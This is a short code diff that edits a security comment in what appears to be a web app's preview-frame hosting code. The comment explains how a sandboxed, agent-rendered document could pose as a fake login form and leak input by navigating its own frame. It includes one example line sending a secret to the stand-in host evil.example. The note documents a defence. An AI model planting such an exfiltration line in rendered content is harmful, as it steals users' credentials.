@@ -27,7 +27,7 @@ const INDEX_HTML = "./apps/web/dist/index.html";
  * `sandbox allow-scripts` denies the document an origin, but a sandboxed
  * navigable may ALWAYS navigate ITSELF (the sandboxed-top-level-navigation flags
  * gate navigating an ANCESTOR only), and `connect-src` / `form-action` do not
- * cover navigation. So an agent document rendered in the SPA's preview modal
+ * cover navigation. So an agent document rendered in the SPA's preview frame
  * could be a fake login form that ships what the user typed out by replacing its
  * own frame — `location = "https://evil.example/?p=" + secret`.
  *
